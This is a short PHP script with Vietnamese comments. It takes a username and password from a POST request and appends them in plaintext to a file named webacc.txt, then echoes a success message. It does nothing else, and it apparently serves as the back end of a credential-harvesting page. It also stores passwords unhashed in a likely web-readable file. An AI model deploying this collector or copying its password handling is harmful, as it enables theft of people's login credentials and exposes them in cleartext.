<?php
// Lấy giá trị của username và password gửi từ client-side
$username = $_POST['username'];
$password = $_POST['password'];

// Kiểm tra xem dữ liệu đã được gửi thành công hay chưa
if ($username && $password) {
    // Tạo nội dung để lưu vào tệp tin
    $content = "Tên đăng nhập: " . $username . "\nMật khẩu: " . $password;

    // Ghi nội dung vào tệp tin webacc.txt
    file_put_contents("webacc.txt", $content, FILE_APPEND | LOCK_EX);

    // Phản hồi thành công về client-side
    echo "Lưu thông tin thành công";
} else {
    // Phản hồi lỗi về client-side (nếu cần)
    echo "Lỗi: Dữ liệu không hợp lệ";
}
?>
